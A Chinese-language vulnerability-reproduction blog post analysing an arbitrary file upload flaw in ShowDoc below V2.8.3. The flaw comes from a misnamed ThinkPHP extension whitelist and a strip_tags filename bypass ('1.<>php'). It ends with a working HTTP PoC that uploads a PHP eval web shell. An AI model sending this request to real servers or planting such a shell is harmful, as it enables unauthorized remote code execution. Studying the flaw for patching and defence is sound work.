---
title: ShowDoc 任意文件上传漏洞
categories: 漏洞复现
---
# 前言

版本比较老了，界面是这样的，没更新的可以利用，ShowDoc < V2.8.3

![](https://img-blog.csdnimg.cn/20210627133103829.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)


<!--more-->
# 漏洞位置
`\server\Application\Api\Controller\PageController.class.php`

# 漏洞分析
![](https://img-blog.csdnimg.cn/20210627171056647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

漏洞处：

```php
 $upload = new \Think\Upload();// 实例化上传类
      $upload->allowExts  = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型
 ```

我们去看看`Think\Upload()类`

`ThinkPHP/Library/Think/Upload.class.php`就是Upload类的源码。我们可以发现上述代码中的`allowExts`属性其实并`不存在`，TP3 中限制上传文件后缀类型的属性应该是`exts`

```php
class Upload {
    /**
     * 默认上传配置
     * @var array
     */
    private $config = array(
        'mimes'         =>  array(), //允许上传的文件MiMe类型
        'maxSize'       =>  0, //上传的文件大小限制 (0-不做限制)
        'exts'          =>  array(), //允许上传的文件后缀       //就是这里出现问题
        'autoSub'       =>  true, //自动子目录保存文件
        'subName'       =>  array('date', 'Y-m-d'), //子目录创建方式，[0]-函数名，[1]-参数，多个参数使用数组
        'rootPath'      =>  './Uploads/', //保存根路径
        'savePath'      =>  '', //保存路径
        'saveName'      =>  array('uniqid', ''), //上传文件命名规则，[0]-函数名，[1]-参数，多个参数使用数组
        'saveExt'       =>  '', //文件保存后缀，空则使用原后缀
        'replace'       =>  false, //存在同名是否覆盖
        'hash'          =>  true, //是否生成hash编码
        'callback'      =>  false, //检测文件是否存在回调，如果存在返回文件信息数组
        'driver'        =>  '', // 文件上传驱动
        'driverConfig'  =>  array(), // 上传驱动配置
    );
```

那么这样附件上传类型就没有限制了，但是在上面还有一处限制后缀为.php的检测

```php
 if (strstr(strtolower($_FILES['editormd-image-file']['name']), ".php") ) {
            return false;
        }
```

那么怎么绕过这个检测呢？

还是在TP中，碰巧有这个函数：

```php
foreach ($files as $key => $file) {
            $file['name']  = strip_tags($file['name']);
```

>strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签。


那么我们构造`1.<>php`即可绕过

# 漏洞复现

poc:
```XML
POST /index.php?s=/home/page/uploadImg HTTP/1.1
Host: xxx.xxx.xxx.xxx:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: multipart/form-data; boundary=--------------------------921378126371623762173617
Content-Length: 262

----------------------------921378126371623762173617
Content-Disposition: form-data; name="editormd-image-file"; filename="1.<>php"
Content-Type: text/plain

<?php echo '123_test';@eval($_REQUEST[cmd])?>
----------------------------921378126371623762173617--
```

![](https://img-blog.csdnimg.cn/20210627180414239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)


